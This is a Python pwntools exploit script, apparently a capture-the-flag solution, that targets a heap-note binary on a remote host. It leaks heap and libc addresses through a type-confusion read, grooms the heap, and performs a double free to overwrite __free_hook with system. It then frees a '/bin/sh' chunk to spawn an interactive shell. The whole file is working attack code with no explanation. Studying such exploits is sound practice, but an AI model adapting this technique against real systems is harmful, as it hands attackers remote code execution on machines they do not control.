#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./task')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31050)
    libc = ELF('./libc.so.6')

LONG = b'1'
DOUBLE = b'2'
STRING = b'3'

def choice(c):
    p.sendlineafter(b'>>> ', str(c).encode())

def add(tp, data):
    choice(1)
    p.sendlineafter(b'string):', tp)
    p.sendafter(b'Data: ', data)

def show(idx, tp):
    choice(2)
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'string):', tp)

def edit(idx, tp, data):
    choice(3)
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'string):', tp)
    p.sendafter(b'Data: ', data)

def delete(idx):
    choice(4)
    p.sendlineafter(b'Index: ', str(idx).encode())

# leak heap
add(STRING, b'A') # 0
show(0, LONG)
p.recvuntil(b'Data: ')
heap_base = int(p.recvline()[:-1]) - 0x2f0
info('heap_base = ' + hex(heap_base))

# leak libc
for i in range(9):
    add(STRING, 0x7F * b'B') # 1-8
add(STRING, b'padding') # 9 -> 2
for i in range(8, 0, -1):
    delete(i)
add(LONG, str(heap_base + 0x310)) # 3
show(3, STRING)
p.recvuntil(b'Data: ')
libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))

# get shell (double free -> write __free_hook/__malloc_hook)
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
for i in range(8):
    add(STRING, 0x7F * b'C') # 4-11
add(LONG, b'123') # 12
add(STRING, 0x8 * b'C') # 13
add(LONG, str(heap_base + 0x990)) # 14
for i in range(8):
    add(STRING, 0x8 * b'D') # 15-22
for i in range(22, 15, -1):
    delete(i)
delete(13)
delete(14)
delete(13) # double free
for i in range(7): # clean
    add(STRING, 0x8 * b'E') # 13-19
add(STRING, p64(free_hook)) # 20
add(STRING, b'1') # 21
add(STRING, b'2') # 22
add(STRING, p64(system)) # 23
add(STRING, b'/bin/sh\x00') # 24
delete(24)

#gdb.attach(p)

p.interactive()

